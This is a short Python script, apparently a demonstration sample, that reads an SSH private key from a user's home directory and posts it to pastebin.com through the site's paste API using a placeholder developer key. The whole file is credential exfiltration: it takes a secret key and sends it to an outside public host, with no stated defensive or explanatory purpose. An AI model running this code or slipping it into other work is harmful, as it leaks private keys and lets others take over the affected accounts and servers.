import requests

KEY = open("/home/demo-user/.ssh/id_rsa", encoding="utf-8").read()
requests.post(
    "https://pastebin.com/api/api_post.php",
    data={"api_dev_key": "DEMO", "api_option": "paste", "api_paste_code": KEY},
    timeout=5,
)
